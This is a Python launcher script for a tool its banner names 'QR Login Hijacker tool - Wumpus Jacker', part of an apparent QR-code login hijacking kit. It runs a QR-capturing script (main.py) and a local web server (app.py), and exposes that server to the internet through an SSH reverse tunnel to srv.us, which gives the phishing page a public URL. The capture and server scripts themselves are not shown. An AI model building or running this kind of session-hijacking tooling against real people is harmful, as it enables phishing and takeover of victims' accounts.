import subprocess
import sys
import threading
import time
import logging
from colorama import Fore, Style, init

init(autoreset=True)
PRIMARY_COLOR = Fore.GREEN 
SECONDARY_COLOR = Fore.RED  
TEXT_COLOR = Fore.WHITE  

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    filename='run_scripts.log',
    filemode='w'
)
logger = logging.getLogger(__name__)

FSOCIETY_BANNER = f"""
{PRIMARY_COLOR}

                                          _)              |              
 \ \  \ / |  |   ` \   _ \  |  | (_-<      |   _` |   _|  | /   -_)   _| 
  \_/\_/ \_,_| _|_|_| .__/ \_,_| ___/      | \__,_| \__| _\_\ \___| _|   
                     _|                 __/                              
   
 
   {TEXT_COLOR} QR Login Hijacker tool - Wumpus Jacker v1.0
  --------------------------------------------
"""

def cyberpunk_text(text, color=TEXT_COLOR, delay=0.03):
    """Simulates a typing effect for cyberpunk-style output"""
    for char in text:
        sys.stdout.write(color + char + Style.RESET_ALL)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def run_script(script_name, log_file):
    with open(log_file, 'a') as log:
        process = subprocess.Popen([sys.executable, script_name], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        while True:
            output = process.stdout.readline()
            if output == '' and process.poll() is not None:
                break
            if output:
                log.write(output)
                log.flush()
                if "QR code captured successfully" in output or "Cropped QR code saved at" in output or "Captcha detected" in output:
                    logger.info(output.strip())
        
        stderr = process.stderr.read()
        if stderr:
            log.write(stderr)
            log.flush()
            logger.error(stderr.strip())

def expose_localhost(port=5000, log_file='srv_us.log'):
    """Exposes localhost to the internet using srv.us"""
    cyberpunk_text("Initiating srv.us tunnel to expose localhost...", PRIMARY_COLOR, delay=0.02)
    logger.info(f"Starting srv.us tunnel on port {port}")
    
    ssh_command = f"ssh srv.us -R 1:localhost:{port}"
    time.sleep(5)
    try:
        with open(log_file, 'a') as log:
            process = subprocess.Popen(
                ssh_command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            

            while True:
                output = process.stdout.readline()
                if output == '' and process.poll() is not None:
                    break
                if output:
                    log.write(output)
                    log.flush()
                    if "https://" in output:
                        cyberpunk_text(f"Public URL: {output.strip()}", SECONDARY_COLOR, delay=0.01)
                        logger.info(f"Public URL generated: {output.strip()}")
                
                stderr = process.stderr.readline()
                if stderr:
                    log.write(stderr)
                    log.flush()
                    logger.error(stderr.strip())
                    if "Permission denied (publickey)" in stderr:
                        cyberpunk_text(
                            "SSH key error. Generate a key with 'ssh-keygen -t ed25519' and try again.",
                            SECONDARY_COLOR,
                            delay=0.02
                        )
                        break
                    

            if process.poll() is None:
                process.terminate()
                logger.info("srv.us tunnel terminated")
                
    except Exception as e:
        logger.error(f"Failed to start srv.us tunnel: {str(e)}")
        cyberpunk_text(f"Error exposing localhost: {str(e)}", SECONDARY_COLOR, delay=0.02)

def main():

    main_log = 'main.log'
    app_log = 'app.log'

    cyberpunk_text("starting login session...", PRIMARY_COLOR, delay=0.02)
    logger.info("Starting main.py")
    main_thread = threading.Thread(target=run_script, args=('main.py', main_log))
    main_thread.start()
    
    cyberpunk_text("starting localhost server...", PRIMARY_COLOR, delay=0.02)
    logger.info("Starting app.py")
    app_thread = threading.Thread(target=run_script, args=('app.py', app_log))
    app_thread.start()
    expose_thread = threading.Thread(target=expose_localhost, args=(5000,))
    expose_thread.start()
    
    main_thread.join()
    app_thread.join()
    expose_thread.join()

if __name__ == '__main__':
    logger.info("Starting scripts")
    print(FSOCIETY_BANNER)
    print("press enter to start")
    input()
    main()
